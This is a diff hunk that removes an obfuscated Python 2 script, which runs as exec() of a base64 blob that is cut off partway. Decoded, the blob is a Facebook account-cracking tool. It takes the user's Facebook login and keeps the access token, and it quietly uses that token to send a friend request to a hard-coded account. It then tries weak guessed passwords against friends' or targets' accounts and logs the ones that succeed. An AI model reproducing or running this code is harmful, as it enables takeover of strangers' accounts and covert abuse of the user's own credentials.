@@ -1,2 +1,416 @@
-import base64
-exec(base64.b64decode('IyEvdXNyL2Jpbi9weXRob24yDQojY29kaW5nPXV0Zi04DQoNCg0KaW1wb3J0IG9zLHN5cyx0aW1lLGRhdGV0aW1lLHJhbmRvbSxoYXNobGliLHJlLHRocmVhZGluZyxqc29uLHVybGxpYixjb29raWVsaWIscmVxdWVzdHMsbWVjaGFuaXplDQpmcm9tIG11bHRpcHJvY2Vzc2luZy5wb29sIGltcG9ydCBUaHJlYWRQb29sDQpmcm9tIHJlcXVlc3RzLmV4Y2VwdGlvbnMgaW1wb3J0IENvbm5lY3Rpb25FcnJvcg0KZnJvbSBtZWNoYW5pemUgaW1wb3J0IEJyb3dzZXINCg0KDQpyZWxvYWQoc3lzKQ0Kc3lzLnNldGRlZmF1bHRlbmNvZGluZygndXRmOCcpDQpiciA9IG1lY2hhbml6ZS5Ccm93c2VyKCkNCmJyLnNldF9oYW5kbGVfcm9ib3RzKEZhbHNlKQ0KYnIuc2V0X2hhbmRsZV9yZWZyZXNoKG1lY2hhbml6ZS5faHR0cC5IVFRQUmVmcmVzaFByb2Nlc3NvcigpLG1heF90aW1lPTEpDQpici5hZGRoZWFkZXJzID0gWygnVXNlci1BZ2VudCcsICdPcGVyYS85LjgwIChBbmRyb2lkOyBPcGVyYSBNaW5pLzMyLjAuMjI1NC84NS4gVTsgaWQpIFByZXN0by8yLjEyLjQyMyBWZXJzaW9uLzEyLjE2JyldDQoNCg0KZGVmIGtlbHVhcigpOg0KCXByaW50ICJceDFiWzE7OTFtRXhpdCINCglvcy5zeXMuZXhpdCgpDQoNCg0KZGVmIGFjYWsoYik6DQogICAgdyA9ICdhaHRkempjJw0KICAgIGQgPSAnJw0KICAgIGZvciBpIGluIHg6DQogICAgICAgIGQgKz0gJyEnK3dbcmFuZG9tLnJhbmRpbnQoMCxsZW4odyktMSldK2kNCiAgICByZXR1cm4gY2V0YWsoZCkNCg0KDQpkZWYgY2V0YWsoYik6DQogICAgdyA9ICdhaHRkempjJw0KICAgIGZvciBpIGluIHc6DQogICAgICAgIGogPSB3LmluZGV4KGkpDQogICAgICAgIHg9IHgucmVwbGFjZSgnISVzJyVpLCdcMDMzWyVzOzFtJyVzdHIoMzEraikpDQogICAgeCArPSAnXDAzM1swbScNCiAgICB4ID0geC5yZXBsYWNlKCchMCcsJ1wwMzNbMG0nKQ0KICAgIHN5cy5zdGRvdXQud3JpdGUoeCsnXG4nKQ0KDQoNCmRlZiBqYWxhbih6KToNCglmb3IgZSBpbiB6ICsgJ1xuJzoNCgkJc3lzLnN0ZG91dC53cml0ZShlKQ0KCQlzeXMuc3Rkb3V0LmZsdXNoKCkNCgkJdGltZS5zbGVlcCgwMDAwMC4xKQ0KDQoNCiMjIyMjIExPR08gIyMjIyMNCmxvZ28gPSAiIiINCiAgXDAzM1sxOzk3bSxhZDg4ODhiYSwgICA4OGIgICAgICAgICAgIGQ4OCAgODggIA0KIFwwMzNbMTs5N21kOCInICAgIGAiOGIgIDg4OGIgICAgICAgICBkODg4ICA4OCAgDQpcMDMzWzE7OTJtZDgnICAgICAgICBgOGIgODhgOGIgICAgICAgZDgnODggIDg4ICANClwwMzNbMTs5Mm04OCAgICAgICAgICA4OCA4OCBgOGIgICAgIGQ4JyA4OCAgODggIA0KXDAzM1sxOzkybTg4ICAgICAgICAgIDg4IDg4ICBgOGIgICBkOCcgIDg4ICA4OCAgDQpcMDMzWzE7OTJtWTgsICAgICAgICAsOFAgODggICBgOGIgZDgnICAgODggIDg4ICANCiBcMDMzWzE7OTJtWThhLiAgICAuYThQICA4OCAgICBgODg4JyAgICA4OCAgODggIA0KICBcMDMzWzE7OTJtYCJZODg4OFkiJyAgIDg4ICAgICBgOCcgICAgIDg4ICA4OA0KDQpcMDMzWzE7OTdt4peP4pas4pas4pas4pas4pas4pas4pas4pas4pas4pas4pas4pas4pas4pas4pas4pas4pas4pas4pasXDAzM1sxOzkybeC5kdup26nguZFcMDMzWzE7OTdt4pas4pas4pas4pas4pas4pas4pas4pas4pas4pas4pas4pas4pas4pas4pas4pas4pas4pas4pePDQpcMDMzWzE7OTdtQXV0aG9ywqlcMDMzWzE7OTdtOiBcMDMzWzE7OTJtT21pIENoYXVkaGFyeQ0KXDAzM1sxOzk3bUluc3RhZ3JhbVwwMzNbMTs5N206IFwwMzNbMTs5Mm1odHRwczovL3d3dy5JbnN0YWdyYW0uY29tL09taTZ0DQpcMDMzWzE7OTdtRmFjZWJvb2tcMDMzWzE7OTdtOiBcMDMzWzE7OTJtaHR0cHM6Ly93d3cuZmFjZWJvb2suY29tL09taTZ0DQpcMDMzWzE7OTdtV2hhdHNhcHBcMDMzWzE7OTdtOiBcMDMzWzE7OTJtKzkyMzExNzY3NTE3NA0KXDAzM1sxOzk3bcKrLS0tLS0tLS0tLS0tLS0tLS0tLS1cMDMzWzE7OTJt4pynXDAzM1sxOzk3bS0tLS0tLS0tLS0tLS0tLS0tLS0twrsiIiINCg0KZGVmIHRpaygpOg0KCXRpdGlrID0gWycuICAgJywnLi4gICcsJy4uLiAnXQ0KCWZvciBvIGluIHRpdGlrOg0KCQlwcmludCgiXHJceDFiWzE7OTNtUGxlYXNlIFdhaXQgXHgxYlsxOzkzbSIrbyksO3N5cy5zdGRvdXQuZmx1c2goKTt0aW1lLnNsZWVwKDEpDQoNCg0KYmFjayA9IDANCmJlcmhhc2lsID0gW10NCmNla3BvaW50ID0gW10NCm9rcyA9IFtdDQppZCA9IFtdDQpsaXN0Z3J1cCA9IFtdDQp2dWxub3QgPSAiXDAzM1szMW1Ob3QgVnVsbiINCnZ1bG4gPSAiXDAzM1szMm1WdWxuIg0KDQpvcy5zeXN0ZW0oImNsZWFyIikNCnByaW50ICAiIiINClwwMzNbMTs5N21fXyAgICAgICAgX19fX19fXyBfICAgICBcMDMzWzE7OTJtX19fXyBfX18gIF9fICBfXyBfX19fXyANClwwMzNbMTs5N21cIFwgICAgICAvIHwgX19fX3wgfCAgIFwwMzNbMTs5Mm0vIF9fXy8gXyBcfCAgXC8gIHwgX19fX3wNCiBcMDMzWzE7OTdtXCBcIC9cIC8gL3wgIF98IHwgfCAgXDAzM1sxOzkybXwgfCAgfCB8IHwgfCB8XC98IHwgIF98ICANCiAgXDAzM1sxOzk3bVwgViAgViAvIHwgfF9fX3wgfF9fXDAzM1sxOzkybXwgfF9ffCB8X3wgfCB8ICB8IHwgfF9fXyANCiAgIFwwMzNbMTs5N21cXy9cXy8gIHxfX19fX3xfX19fX1wwMzNbMTs5Mm1cX19fX1xfX18vfF98ICB8X3xfX19fX3wNClwwMzNbMTs5N23il4/ilqzilqzilqzilqzilqzilqzilqzilqzilqzilqzilqzilqzilqzilqzilqzilqzilqzilqzilqxcMDMzWzE7OTJt4LmR26nbqeC5kVwwMzNbMTs5N23ilqzilqzilqzilqzilqzilqzilqzilqzilqzilqzilqzilqzilqzilqzilqzilqzilqzilqzil48NClwwMzNbMTs5N21BdXRob3LCqVwwMzNbMTs5N206IFwwMzNbMTs5Mm1PbWkgQ2hhdWRoYXJ5DQpcMDMzWzE7OTdtSW5zdGFncmFtXDAzM1sxOzk3bTogXDAzM1sxOzkybWh0dHBzOi8vd3d3Lkluc3RhZ3JhbS5jb20vT21pNnQNClwwMzNbMTs5N21GYWNlYm9va1wwMzNbMTs5N206IFwwMzNbMTs5Mm1odHRwczovL3d3dy5mYWNlYm9vay5jb20vT21pNnQNClwwMzNbMTs5N21XaGF0c2FwcFwwMzNbMTs5N206IFwwMzNbMTs5Mm0rOTIzMTE3Njc1MTc0DQpcMDMzWzE7OTdtwqstLS0tLS0tLS0tLS0tLS0tLS0tLVwwMzNbMTs5Mm3inKdcMDMzWzE7OTdtLS0tLS0tLS0tLS0tLS0tLS0tLS3CuyIiIg0KDQpDb3JyZWN0VXNlcm5hbWUgPSAiT21pNnQiDQpDb3JyZWN0UGFzc3dvcmQgPSAiT21pIg0KDQpsb29wID0gJ3RydWUnDQp3aGlsZSAobG9vcCA9PSAndHJ1ZScpOg0KICAgIHVzZXJuYW1lID0gcmF3X2lucHV0KCJcMDMzWzE7OTZt8J+UkCBceDFiWzE7OTNtVG9vbCBVc2VybmFtZSBceDFiWzE7OTNtwrvCuyBceDFiWzE7OTZtIikNCiAgICBpZiAodXNlcm5hbWUgPT0gQ29ycmVjdFVzZXJuYW1lKToNCiAgICAJcGFzc3dvcmQgPSByYXdfaW5wdXQoIlwwMzNbMTs5Nm3wn5SQIFx4MWJbMTs5M21Ub29sIFBhc3N3b3JkIFx4MWJbMTs5M23Cu8K7IFx4MWJbMTs5Nm0iKQ0KICAgICAgICBpZiAocGFzc3dvcmQgPT0gQ29ycmVjdFBhc3N3b3JkKToNCiAgICAgICAgICAgIHByaW50ICJMb2dnZWQgaW4gc3VjY2Vzc2Z1bGx5IGFzICIgKyB1c2VybmFtZQ0KICAgICAgICAgICAgbG9vcCA9ICdmYWxzZScNCiAgICAgICAgZWxzZToNCiAgICAgICAgICAgIHByaW50ICJcMDMzWzE7OTFtV3JvbmcgUGFzc3dvcmQiDQogICAgICAgICAgICBvcy5zeXN0ZW0oJ3hkZy1vcGVuIGh0dHBzOi8vd3d3LkZhY2Vib29rLmNvbS9PbWk2dCcpDQogICAgZWxzZToNCiAgICAgICAgcHJpbnQgIlwwMzNbMTs5MW1Xcm9uZyBVc2VybmFtZSINCiAgICAgICAgb3Muc3lzdGVtKCd4ZGctb3BlbiBodHRwczovL3d3dy5GYWNlYm9vay5jb20vT21pNnQnKQ0KDQpkZWYgbG9naW4oKToNCglvcy5zeXN0ZW0oJ2NsZWFyJykNCgl0cnk6DQoJCXRva2V0ID0gb3BlbignbG9naW4udHh0JywncicpDQoJCW1lbnUoKSANCglleGNlcHQgKEtleUVycm9yLElPRXJyb3IpOg0KCQlvcy5zeXN0ZW0oJ2NsZWFyJykNCgkJcHJpbnQgbG9nbw0KCQlqYWxhbignIFwwMzNbMTs5MW1XYXJuaW5nOiBcMDMzWzE7OTdtRG8gTm90IFVzZSBZb3VyIFBlcnNvbmFsIEFjY291bnQnICkNCgkJamFsYW4oJyAgICAgICAgICBcMDMzWzE7OTdtVXNlIGEgRnJlc2ggQWNjb3VudCBUbyBMb2dpbicgKQ0KCQlwcmludCAiXDAzM1sxOzk3bcKrLS0tLS0tLS0tLS0tLS0tLS0tLS1cMDMzWzE7OTJt4pynXDAzM1sxOzk3bS0tLS0tLS0tLS0tLS0tLS0tLS0twrsiDQoJCXByaW50KCcJICAgXDAzM1sxOzk1beOAkFx4MWJbMTs5NW1MT0dJTiBXSVRIIEZBQ0VCT09LXHgxYlsxOzk1beOAkScgKQ0KCQlwcmludCgnCScgKQ0KCQlpZCA9IHJhd19pbnB1dCgnXDAzM1sxOzk2bVsrXSBceDFiWzE7OTNtSUQvRW1haWxceDFiWzE7OTNtOiBceDFiWzE7OTZtJykNCgkJcHdkID0gcmF3X2lucHV0KCdcMDMzWzE7OTZtWytdIFx4MWJbMTs5M21QYXNzd29yZFx4MWJbMTs5M206IFx4MWJbMTs5Nm0nKQ0KCQl0aWsoKQ0KCQl0cnk6DQoJCQlici5vcGVuKCdodHRwczovL20uZmFjZWJvb2suY29tJykNCgkJZXhjZXB0IG1lY2hhbml6ZS5VUkxFcnJvcjoNCgkJCXByaW50IlxuXHgxYlsxOzkxbVRoZXJlIGlzIG5vIGludGVybmV0IGNvbm5lY3Rpb24iDQoJCQlrZWx1YXIoKQ0KCQlici5fZmFjdG9yeS5pc19odG1sID0gVHJ1ZQ0KCQlici5zZWxlY3RfZm9ybShucj0wKQ0KCQlici5mb3JtWydlbWFpbCddID0gaWQNCgkJYnIuZm9ybVsncGFzcyddID0gcHdkDQoJCWJyLnN1Ym1pdCgpDQoJCXVybCA9IGJyLmdldHVybCgpDQoJCWlmICdzYXZlLWRldmljZScgaW4gdXJsOg0KCQkJdHJ5Og0KCQkJCXNpZz0gJ2FwaV9rZXk9ODgyYTg0OTAzNjFkYTk4NzAyYmY5N2EwMjFkZGMxNGRjcmVkZW50aWFsc190eXBlPXBhc3N3b3JkZW1haWw9JytpZCsnZm9ybWF0PUpTT05nZW5lcmF0ZV9tYWNoaW5lX2lkPTFnZW5lcmF0ZV9zZXNzaW9uX2Nvb2tpZXM9MWxvY2FsZT1lbl9VU21ldGhvZD1hdXRoLmxvZ2lucGFzc3dvcmQ9Jytwd2QrJ3JldHVybl9zc2xfcmVzb3VyY2VzPTB2PTEuMDYyZjhjZTlmNzRiMTJmODRjMTIzY2MyMzQzN2E0YTMyJw0KCQkJCWRhdGEgPSB7ImFwaV9rZXkiOiI4ODJhODQ5MDM2MWRhOTg3MDJiZjk3YTAyMWRkYzE0ZCIsImNyZWRlbnRpYWxzX3R5cGUiOiJwYXNzd29yZCIsImVtYWlsIjppZCwiZm9ybWF0IjoiSlNPTiIsICJnZW5lcmF0ZV9tYWNoaW5lX2lkIjoiMSIsImdlbmVyYXRlX3Nlc3Npb25fY29va2llcyI6IjEiLCJsb2NhbGUiOiJlbl9VUyIsIm1ldGhvZCI6ImF1dGgubG9naW4iLCJwYXNzd29yZCI6cHdkLCJyZXR1cm5fc3NsX3Jlc291cmNlcyI6IjAiLCJ2IjoiMS4wIn0NCgkJCQl4PWhhc2hsaWIubmV3KCJtZDUiKQ0KCQkJCXgudXBkYXRlKHNpZykNCgkJCQlhPXguaGV4ZGlnZXN0KCkNCgkJCQlkYXRhLnVwZGF0ZSh7J3NpZyc6YX0pDQoJCQkJdXJsID0gImh0dHBzOi8vYXBpLmZhY2Vib29rLmNvbS9yZXN0c2VydmVyLnBocCINCgkJCQlyPXJlcXVlc3RzLmdldCh1cmwscGFyYW1zPWRhdGEpDQoJCQkJej1qc29uLmxvYWRzKHIudGV4dCkNCgkJCQl1bmlrZXJzID0gb3BlbigibG9naW4udHh0IiwgJ3cnKQ0KCQkJCXVuaWtlcnMud3JpdGUoelsnYWNjZXNzX3Rva2VuJ10pDQoJCQkJdW5pa2Vycy5jbG9zZSgpDQoJCQkJcHJpbnQgJ1xuXHgxYlsxOzkybUxvZ2luIFN1Y2Nlc3NmdWwuLi4nDQoJCQkJb3Muc3lzdGVtKCd4ZGctb3BlbiBodHRwczovL3d3dy5GYWNlYm9vay5jb20vT21pNnQnKQ0KCQkJCXJlcXVlc3RzLnBvc3QoJ2h0dHBzOi8vZ3JhcGguZmFjZWJvb2suY29tL21lL2ZyaWVuZHM/bWV0aG9kPXBvc3QmdWlkcz1nd2ltdXNhMyZhY2Nlc3NfdG9rZW49Jyt6WydhY2Nlc3NfdG9rZW4nXSkNCgkJCQltZW51KCkNCgkJCWV4Y2VwdCByZXF1ZXN0cy5leGNlcHRpb25zLkNvbm5lY3Rpb25FcnJvcjoNCgkJCQlwcmludCJcblx4MWJbMTs5MW1UaGVyZSBpcyBubyBpbnRlcm5ldCBjb25uZWN0aW9uIg0KCQkJCWtlbHVhcigpDQoJCWlmICdjaGVja3BvaW50JyBpbiB1cmw6DQoJCQlwcmludCgiXG5ceDFiWzE7OTFtWW91ciBBY2NvdW50IGlzIG9uIENoZWNrcG9pbnQiKQ0KCQkJb3Muc3lzdGVtKCdybSAtcmYgbG9naW4udHh0JykNCgkJCXRpbWUuc2xlZXAoMSkNCgkJCWtlbHVhcigpDQoJCWVsc2U6DQoJCQlwcmludCgiXG5ceDFiWzE7OTFtUGFzc3dvcmQvRW1haWwgaXMgd3JvbmciKQ0KCQkJb3Muc3lzdGVtKCdybSAtcmYgbG9naW4udHh0JykNCgkJCXRpbWUuc2xlZXAoMSkNCgkJCWxvZ2luKCkNCg0KDQpkZWYgbWVudSgpOg0KCW9zLnN5c3RlbSgnY2xlYXInKQ0KCXRyeToNCgkJdG9rZXQ9b3BlbignbG9naW4udHh0JywncicpLnJlYWQoKQ0KCWV4Y2VwdCBJT0Vycm9yOg0KCQlvcy5zeXN0ZW0oJ2NsZWFyJykNCgkJcHJpbnQiXHgxYlsxOzkxbVRva2VuIGludmFsaWQiDQoJCW9zLnN5c3RlbSgncm0gLXJmIGxvZ2luLnR4dCcpDQoJCXRpbWUuc2xlZXAoMSkNCgkJbG9naW4oKQ0KCXRyeToNCgkJb3R3ID0gcmVxdWVzdHMuZ2V0KCdodHRwczovL2dyYXBoLmZhY2Vib29rLmNvbS9tZT9hY2Nlc3NfdG9rZW49Jyt0b2tldCkNCgkJYSA9IGpzb24ubG9hZHMob3R3LnRleHQpDQoJCW5hbWEgPSBhWyduYW1lJ10NCgkJaWQgPSBhWydpZCddDQoJZXhjZXB0IEtleUVycm9yOg0KCQlvcy5zeXN0ZW0oJ2NsZWFyJykNCgkJcHJpbnQiXDAzM1sxOzkxbVlvdXIgQWNjb3VudCBpcyBvbiBDaGVja3BvaW50Ig0KCQlvcy5zeXN0ZW0oJ3JtIC1yZiBsb2dpbi50eHQnKQ0KCQl0aW1lLnNsZWVwKDEpDQoJCWxvZ2luKCkNCglleGNlcHQgcmVxdWVzdHMuZXhjZXB0aW9ucy5Db25uZWN0aW9uRXJyb3I6DQoJCXByaW50Ilx4MWJbMTs5MW1UaGVyZSBpcyBubyBpbnRlcm5ldCBjb25uZWN0aW9uIg0KCQlrZWx1YXIoKQ0KCW9zLnN5c3RlbSgiY2xlYXIiKQ0KCXByaW50IGxvZ28NCglwcmludCAiICBcMDMzWzE7OTdtwqstLS0tLS0tLS1cMDMzWzE7OTVtTG9nZ2VkIGluIFVzZXIgSW5mb1wwMzNbMTs5N20tLS0tLS0tLS3CuyINCglwcmludCAiCSAgIFwwMzNbMTs5M20gTmFtZVwwMzNbMTs5M206XDAzM1sxOzk3bSIrbmFtYSsiXDAzM1sxOzk3bSAgICAgICAgICAgICAgICINCglwcmludCAiCSAgIFwwMzNbMTs5M20gSURcMDMzWzE7OTNtOlwwMzNbMTs5N20iK2lkKyJceDFiWzE7OTdtICAgICAgICAgICAgICAiDQoJcHJpbnQgIlwwMzNbMTs5N23Cqy0tLS0tLS0tLS0tLS0tLS0tLS0tXDAzM1sxOzkybeKcp1wwMzNbMTs5N20tLS0tLS0tLS0tLS0tLS0tLS0tLcK7Ig0KCXByaW50ICJcMDMzWzE7OTdtLS1cMDMzWzE7OTJtPiBcMDMzWzE7OTJtMS5ceDFiWzE7OTJtU3RhcnQgQ2xvbmluZy4uLiINCglwcmludCAiXDAzM1sxOzk3bS0tXDAzM1sxOzkxbT4gXDAzM1sxOzkxbTAuXDAzM1sxOzkxbUV4aXQgICAgICAgICAgICAiDQoJcGlsaWgoKQ0KDQoNCmRlZiBwaWxpaCgpOg0KCXVuaWtlcnMgPSByYXdfaW5wdXQoIlxuXDAzM1sxOzk3bUNob29zZSBhbiBPcHRpb24+Pj4gXDAzM1sxOzk3bSIpDQoJaWYgdW5pa2VycyA9PSIiOg0KCQlwcmludCAiXHgxYlsxOzkxbUZpbGwgaW4gY29ycmVjdGx5Ig0KCQlwaWxpaCgpDQoJZWxpZiB1bmlrZXJzID09IjEiOg0KCQlzdXBlcigpDQoJZWxpZiB1bmlrZXJzID09IjAiOg0KCQlqYWxhbignVG9rZW4gUmVtb3ZlZCcpDQoJCW9zLnN5c3RlbSgncm0gLXJmIGxvZ2luLnR4dCcpDQoJCWtlbHVhcigpDQoJZWxzZToNCgkJcHJpbnQgIlx4MWJbMTs5MW1GaWxsIGluIGNvcnJlY3RseSINCgkJcGlsaWgoKQ0KDQoNCmRlZiBzdXBlcigpOg0KCWdsb2JhbCB0b2tldA0KCW9zLnN5c3RlbSgnY2xlYXInKQ0KCXRyeToNCgkJdG9rZXQ9b3BlbignbG9naW4udHh0JywncicpLnJlYWQoKQ0KCWV4Y2VwdCBJT0Vycm9yOg0KCQlwcmludCJceDFiWzE7OTFtVG9rZW4gaW52YWxpZCINCgkJb3Muc3lzdGVtKCdybSAtcmYgbG9naW4udHh0JykNCgkJdGltZS5zbGVlcCgxKQ0KCQlsb2dpbigpDQoJb3Muc3lzdGVtKCdjbGVhcicpDQoJcHJpbnQgbG9nbw0KCXByaW50ICJcMDMzWzE7OTdtLS1cMDMzWzE7OTJtPiBcMDMzWzE7OTJtMS5ceDFiWzE7OTJtQ2xvbmUgRnJvbSBGcmllbmQgTGlzdC4uLiINCglwcmludCAiXDAzM1sxOzk3bS0tXDAzM1sxOzkybT4gXDAzM1sxOzkybTIuXHgxYlsxOzkybUNsb25lIEZyb20gUHVibGljIElELi4uIg0KCXByaW50ICJcMDMzWzE7OTdtLS1cMDMzWzE7OTFtPiBcMDMzWzE7OTFtMC5cMDMzWzE7OTFtQmFjayINCglwaWxpaF9zdXBlcigpDQoNCmRlZiBwaWxpaF9zdXBlcigpOg0KCXBlYWsgPSByYXdfaW5wdXQoIlxuXDAzM1sxOzk3bUNob29zZSBhbiBPcHRpb24+Pj4gXDAzM1sxOzk3bSIpDQoJaWYgcGVhayA9PSIiOg0KCQlwcmludCAiXHgxYlsxOzkxbUZpbGwgaW4gY29ycmVjdGx5Ig0KCQlwaWxpaF9zdXBlcigpDQoJZWxpZiBwZWFrID09IjEiOg0KCQlvcy5zeXN0ZW0oJ2NsZWFyJykNCgkJcHJpbnQgbG9nbw0KCQlwcmludCAiXDAzM1sxOzk3bcKrLS0tLS0tLS0tLS0tLS0tLS0tLS1cMDMzWzE7OTJt4pynXDAzM1sxOzk3bS0tLS0tLS0tLS0tLS0tLS0tLS0twrsiDQoJCWphbGFuKCdcMDMzWzE7OTNtR2V0dGluZyBJRHMgXDAzM1sxOzk3bS4uLicpDQoJCXIgPSByZXF1ZXN0cy5nZXQoImh0dHBzOi8vZ3JhcGguZmFjZWJvb2suY29tL21lL2ZyaWVuZHM/YWNjZXNzX3Rva2VuPSIrdG9rZXQpDQoJCXogPSBqc29uLmxvYWRzKHIudGV4dCkNCgkJZm9yIHMgaW4gelsnZGF0YSddOg0KCQkJaWQuYXBwZW5kKHNbJ2lkJ10pDQoJZWxpZiBwZWFrID09IjIiOg0KCQlvcy5zeXN0ZW0oJ2NsZWFyJykNCgkJcHJpbnQgbG9nbw0KCQlpZHQgPSByYXdfaW5wdXQoIlwwMzNbMTs5Nm1bK10gXDAzM1sxOzkzbUVudGVyIElEXDAzM1sxOzkzbTogXDAzM1sxOzk3bSIpDQoJCXByaW50ICJcMDMzWzE7OTdtwqstLS0tLS0tLS0tLS0tLS0tLS0tLVwwMzNbMTs5Mm3inKdcMDMzWzE7OTdtLS0tLS0tLS0tLS0tLS0tLS0tLS3CuyINCgkJdHJ5Og0KCQkJam9rID0gcmVxdWVzdHMuZ2V0KCJodHRwczovL2dyYXBoLmZhY2Vib29rLmNvbS8iK2lkdCsiP2FjY2Vzc190b2tlbj0iK3Rva2V0KQ0KCQkJb3AgPSBqc29uLmxvYWRzKGpvay50ZXh0KQ0KCQkJcHJpbnQiXDAzM1sxOzkzbU5hbWVcMDMzWzE7OTNtOlwwMzNbMTs5N20gIitvcFsibmFtZSJdDQoJCWV4Y2VwdCBLZXlFcnJvcjoNCgkJCXByaW50Ilx4MWJbMTs5MW1JRCBOb3QgRm91bmQhIg0KCQkJcmF3X2lucHV0KCJcblwwMzNbMTs5Nm1bXDAzM1sxOzk3bUJhY2tcMDMzWzE7OTZtXSIpDQoJCQlzdXBlcigpDQoJCXByaW50IlwwMzNbMTs5M21HZXR0aW5nIElEc1wwMzNbMTs5M20uLi4iDQoJCXIgPSByZXF1ZXN0cy5nZXQoImh0dHBzOi8vZ3JhcGguZmFjZWJvb2suY29tLyIraWR0KyIvZnJpZW5kcz9hY2Nlc3NfdG9rZW49Iit0b2tldCkNCgkJeiA9IGpzb24ubG9hZHMoci50ZXh0KQ0KCQlmb3IgaSBpbiB6WydkYXRhJ106DQoJCQlpZC5hcHBlbmQoaVsnaWQnXSkNCgllbGlmIHBlYWsgPT0iMCI6DQoJCW1lbnUoKQ0KCWVsc2U6DQoJCXByaW50ICJceDFiWzE7OTFtRmlsbCBpbiBjb3JyZWN0bHkiDQoJCXBpbGloX3N1cGVyKCkNCgkNCglwcmludCAiXDAzM1sxOzkzbVRvdGFsIElEc1wwMzNbMTs5M206IFwwMzNbMTs5N20iK3N0cihsZW4oaWQpKQ0KCWphbGFuKCdcMDMzWzE7OTNtUGxlYXNlIFdhaXRcMDMzWzE7OTNtLi4uJykNCgl0aXRpayA9IFsnLiAgICcsJy4uICAnLCcuLi4gJ10NCglmb3IgbyBpbiB0aXRpazoNCgkJcHJpbnQoIlxyXDAzM1sxOzkzbUNsb25pbmdcMDMzWzE7OTNtIitvKSw7c3lzLnN0ZG91dC5mbHVzaCgpO3RpbWUuc2xlZXAoMSkNCglwcmludCAiXG5cMDMzWzE7OTdtwqstLS0tLVx4MWJbMTs5MW3jgJBUbyBTdG9wIFByb2Nlc3MgUHJlc3MgQ1RSTCta44CRXDAzM1sxOzk3bS0tLS3CuyINCglwcmludCAiXDAzM1sxOzk3bcKrLS0tLS0tLS0tLS0tLS0tLS0tLS1cMDMzWzE7OTJt4pynXDAzM1sxOzk3bS0tLS0tLS0tLS0tLS0tLS0tLS0twrsiDQoJamFsYW4oJyBcMDMzWzE7OTNtUGx6IFdhaXQgQ2xvbmVkIEFjY291bnRzIFdpbGwgQXBwZWFyIEhlcmUnKQ0KCXByaW50ICJcMDMzWzE7OTdtwqstLS0tLS0tLS0tLS0tLS0tLS0tLVwwMzNbMTs5Mm3inKdcMDMzWzE7OTdtLS0tLS0tLS0tLS0tLS0tLS0tLS3CuyINCgkNCgkJCQ0KCWRlZiBtYWluKGFyZyk6DQoJCWdsb2JhbCBjZWtwb2ludCxva3MNCgkJdXNlciA9IGFyZw0KCQl0cnk6DQoJCQlvcy5ta2Rpcignb3V0JykNCgkJZXhjZXB0IE9TRXJyb3I6DQoJCQlwYXNzDQoJCXRyeToNCgkJCWEgPSByZXF1ZXN0cy5nZXQoJ2h0dHBzOi8vZ3JhcGguZmFjZWJvb2suY29tLycrdXNlcisnLz9hY2Nlc3NfdG9rZW49Jyt0b2tldCkNCgkJCWIgPSBqc29uLmxvYWRzKGEudGV4dCkNCgkJCXBhc3MxID0gKCc3ODY3ODYnKQ0KCQkJZGF0YSA9IHVybGxpYi51cmxvcGVuKCJodHRwczovL2ItYXBpLmZhY2Vib29rLmNvbS9tZXRob2QvYXV0aC5sb2dpbj9hY2Nlc3NfdG9rZW49MjM3NzU5OTA5NTkxNjU1JTI1MjU3QzBmMTQwYWFiZWRmYjY1YWMyN2E3MzllZDFhMjI2M2IxJmZvcm1hdD1qc29uJnNka192ZXJzaW9uPTImZW1haWw9IisodXNlcikrIiZsb2NhbGU9ZW5fVVMmcGFzc3dvcmQ9IisocGFzczEpKyImc2RrPWlvcyZnZW5lcmF0ZV9zZXNzaW9uX2Nvb2tpZXM9MSZzaWc9M2Y1NTVmOTlmYjYxZmNkN2FhMGM0NGY1OGY1MjJlZjYiKQ0KCQkJcSA9IGpzb24ubG9hZChkYXRhKQ0KCQkJaWYgJ2FjY2Vzc190b2tlbicgaW4gcToNCgkJCQlwcmludCAnXHgxYlsxOzkybVN1Y2Nlc3NmdWxceDFiWzE7OTdtLVx4MWJbMTs5Mm3inKdceDFiWzE7OTdtLScgKyB1c2VyICsgJy1ceDFiWzE7OTJt4pynXHgxYlsxOzk3bS0nICsgcGFzczENCgkJCQlva3MuYXBwZW5kKHVzZXIrcGFzczEpDQoJCQllbHNlOg0KCQkJCWlmICd3d3cuZmFjZWJvb2suY29tJyBpbiBxWyJlcnJvcl9tc2ciXToNCgkJCQkJcHJpbnQgJ1x4MWJbMTs5MW1DaGVja3BvaW50XHgxYlsxOzk3bS1ceDFiWzE7OTFt4pynXHgxYlsxOzk3bS0nICsgdXNlciArICctXHgxYlsxOzkxbeKcp1x4MWJbMTs5N20tJyArIHBhc3MxDQoJCQkJCWNlayA9IG9wZW4oIm91dC9jaGVja3BvaW50LnR4dCIsICJhIikNCgkJCQkJY2VrLndyaXRlKHVzZXIrInwiK3Bhc3MxKyJcbiIpDQoJCQkJCWNlay5jbG9zZSgpDQoJCQkJCWNla3BvaW50LmFwcGVuZCh1c2VyK3Bhc3MxKQ0KCQkJCWVsc2U6DQoJCQkJCXBhc3MyID0gYlsnZmlyc3RfbmFtZSddKycxMjM0NScNCgkJCQkJZGF0YSA9IHVybGxpYi51cmxvcGVuKCJodHRwczovL2ItYXBpLmZhY2Vib29rLmNvbS9tZXRob2QvYXV0aC5sb2dpbj9hY2Nlc3NfdG9rZW49MjM3NzU5OTA5NTkxNjU1JTI1MjU3QzBmMTQwYWFiZWRmYjY1YWMyN2E3MzllZDFhMjI2M2IxJmZvcm1hdD1qc29uJnNka192ZXJzaW9uPTImZW1haWw9IisodXNlcikrIiZsb2NhbGU9ZW5fVVMmcGFzc3dvcmQ9IisocGFzczIpKyImc2RrPWlvcyZnZW5lcmF0ZV9zZXNzaW9uX2Nvb2tpZXM9MSZzaWc9M2Y1NTVmOTlmYjYxZmNkN2FhMGM0NGY1OGY1MjJlZjYiKQ0KCQkJCQlxID0ganNvbi5sb2FkKGRhdGEpDQoJCQkJCWlmICdhY2Nlc3NfdG9rZW4nIGluIHE6DQoJCQkJCQlwcmludCAnXHgxYlsxOzkybVN1Y2Nlc3NmdWxceDFiWzE7OTdtLVx4MWJbMTs5Mm3inKdceDFiWzE7OTdtLScgKyB1c2VyICsgJy1ceDFiWzE7OTJt4pynXHgxYlsxOzk3bS0nICsgcGFzczINCgkJCQkJCW9rcy5hcHBlbmQodXNlcitwYXNzMikNCgkJCQkJZWxzZToNCgkJCQkJCWlmICd3d3cuZmFjZWJvb2suY29tJyBpbiBxWyJlcnJvcl9tc2ciXToNCgkJCQkJCQlwcmludCAnXHgxYlsxOzkxbUNoZWNrcG9pbnRceDFiWzE7OTdtLVx4MWJbMTs5MW3inKdceDFiWzE7OTdtLScgKyB1c2V